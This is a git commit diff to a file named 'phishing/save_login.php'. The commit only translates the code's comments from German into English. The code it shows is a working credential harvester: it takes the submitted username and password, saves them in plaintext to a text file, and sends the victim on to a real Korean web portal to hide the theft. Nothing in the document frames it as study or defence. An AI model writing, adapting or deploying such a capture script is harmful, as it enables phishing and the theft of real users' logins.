282e82bfc5f66202add9eb3070acee54283145d2
normanscrg <150029830+normanscrg@users.noreply.github.com>
2024-06-11 20:44:44 +0900

    Update save_login.php

--- phishing/save_login.php
+++ phishing/save_login.php
@@ -3,16 +3,16 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
-    // Erstellen des Textinhalts für die Datei
+    // var for Username + Password
     $text = "Username: $username\nPassword: $password";
 
-    // Definieren des Speicherpfads
+    // define the path
     $file_path = 'logindaten.txt';
 
-    // Schreiben der Datei ins Verzeichnis
+    // text in directory
     file_put_contents($file_path, $text);
 
-    // Weiterleiten zur gewünschten Seite
+    // connection to different sites
     header('Location: https://www.daum.net');
     exit();
 }
